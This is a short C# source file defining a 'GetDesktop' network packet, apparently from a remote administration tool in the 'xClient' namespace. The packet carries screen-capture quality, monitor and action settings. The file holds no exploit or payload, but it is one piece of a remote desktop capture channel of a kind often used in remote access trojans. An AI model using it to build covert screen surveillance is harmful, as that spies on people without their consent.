using ProtoBuf;
using xClient.Core.Networking;
using xClient.Enums;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetDesktop : IPacket
    {
        [ProtoMember(1)]
        public int Quality { get; set; }

        [ProtoMember(2)]
        public int Monitor { get; set; }

        [ProtoMember(3)]
        public RemoteDesktopAction Action { get; set; }

        public GetDesktop()
        {
        }

        public GetDesktop(int quality, int monitor, RemoteDesktopAction action)
        {
            this.Quality = quality;
            this.Monitor = monitor;
            this.Action = action;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}